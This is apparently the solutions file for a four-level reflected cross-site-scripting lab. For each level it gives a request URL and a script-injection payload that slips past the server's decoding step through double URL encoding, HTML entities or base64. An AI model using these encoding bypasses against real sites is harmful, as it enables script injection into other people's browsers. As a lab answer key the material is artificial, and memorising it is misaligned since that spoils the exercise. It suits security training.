# dblenc — solutions

Server decodes (URL twice / HTML entities / base64 / URL once) before reflection.

### dblenc-level1

`/dblenc/level1/?query=%25253Cscript%25253Ealert(1)%25253C/script%25253E`

- payload: `%253Cscript%253Ealert(1)%253C/script%253E`
- context: server URL-decodes twice; send triple-encoded `<` so double-decode yields raw

### dblenc-level2

`/dblenc/level2/?query=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B`

- payload: `&lt;script&gt;alert(1)&lt;/script&gt;`
- context: server decodes HTML entities then reflects raw

### dblenc-level3

`/dblenc/level3/?query=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D`

- payload: `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` (base64 of `<script>alert(1)</script>`)
- context: server base64-decodes then reflects raw

### dblenc-level4

`/dblenc/level4/?query=%253Cscript%253Ealert(1)%253C/script%253E`

- payload: `%3Cscript%3Ealert(1)%3C/script%3E`
- context: server URL-decodes once; double-encode `<` to deliver after decode
